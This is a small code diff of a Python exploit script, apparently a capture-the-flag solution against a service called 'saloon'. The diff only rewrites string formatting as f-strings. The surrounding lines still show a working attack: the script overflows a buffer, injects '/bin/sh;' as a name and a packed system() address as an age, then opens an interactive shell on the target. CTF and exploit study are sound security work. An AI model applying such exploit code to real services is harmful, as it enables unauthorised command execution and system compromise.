@@ -81,7 +81,7 @@ class saloon(remote, MemLeak):
         log.info("Sending name %r and age %r" % (name, age))
         self.send("2")
         self.recvuntil("Age: ")
-        self.send(age if isinstance(age,str) else str(age) + ' ')
+        self.send(age if isinstance(age,str) else f'{str(age)} ')
         self.recvuntil("Name: ")
         self.send(name)
 
@@ -239,5 +239,9 @@ c = connect()
 c.clean_and_log(0.5)
 c.fill_stack('A'*63)
 c.clean_and_log(0.5)
-c.name_age(name='/bin/sh;'.ljust(27), age=str(p_name) + '    ' + pack(system)[:6] + '!' + '\x00')
+c.name_age(
+    name='/bin/sh;'.ljust(27),
+    age=f'{str(p_name)}    {pack(system)[:6]}!' + '\x00',
+)
+
 c.interactive()
